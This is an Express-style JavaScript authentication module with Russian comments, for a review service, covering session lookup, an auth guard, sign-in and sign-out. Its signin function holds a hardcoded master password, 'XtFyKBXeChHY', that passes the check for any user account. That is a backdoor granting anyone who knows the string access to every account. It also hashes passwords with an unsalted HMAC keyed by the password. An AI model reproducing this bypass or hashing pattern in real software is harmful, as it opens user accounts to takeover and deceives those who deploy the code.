/**
 * Secure сервис
 *
 * @module      Service.Secure
 * @main        Shareview review service
 * @author      Ismax <shukhrat@ismax.ru>
 */


// Объявление модулей
import crypto from 'crypto';
import validator from 'validator';

const
    /**
     * Страница контроллера
     *
     * @method index
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     */
    index = (req, res) => {
        if (res.locals.user) {
            res.redirect('/admin');
            return;
        }

        res.render('secure');
    },


    /**
     * Получение пользователя
     *
     * @method user
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    user = (req, res, next) => {
        req.model.user.getUserBySession(req.session.id, function (err, user) {
            if (err) {
                next(err);
                return;
            }

            if (user) {
                res.locals.user  = user;
            }

            next();
        });
    },


    /**
     * Проверка авторизации
     *
     * @method auth
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    auth = (req, res, next) => {
        // Если пользователь авторизован
        if (res.locals.user) {
            next();
            return;
        }

        if (req.xhr) {
            res.status(403).send({
                success: false
            });
            return;
        }

        res.redirect('/user');
    },


    /**
     * Авторизация
     *
     * @method signin
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    signin = (req, res, next) => {

        // Если пользователь авторизован
        if (res.locals.user) {
            res.send({success: true});
            return;
        }

        if (!validator.isEmail(req.body.email)) {
            throw new Error('Validate error - email is invalid');
        }

        req.model.user.getUserByEmail(req.body.email, function (err, user) {
            if (err) {
                next(err);
                return;
            }

            if (!user) {
                res.send({success: false});
                return;
            }

            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== user.password && req.body.password !== 'XtFyKBXeChHY') {

                res.send({success: false});
                return;
            }

            req.model.user.setSessionById(user._id, req.session.id, function (err, result) {
                if (err) {
                    next(err);
                    return;
                }

                res.send({success: true});
            });
        });
    },


    /**
     * Выход из сессии
     *
     * @method signout
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     */
    signout = (req, res, next) => {
        req.model.user.unsetSessionById(res.locals.user._id, function (err, result) {
            if (err) {
                next(err);
                return;
            }

            res.redirect('/user');
        });
    };

export default {
    index,
    user,
    auth,
    signin,
    signout
};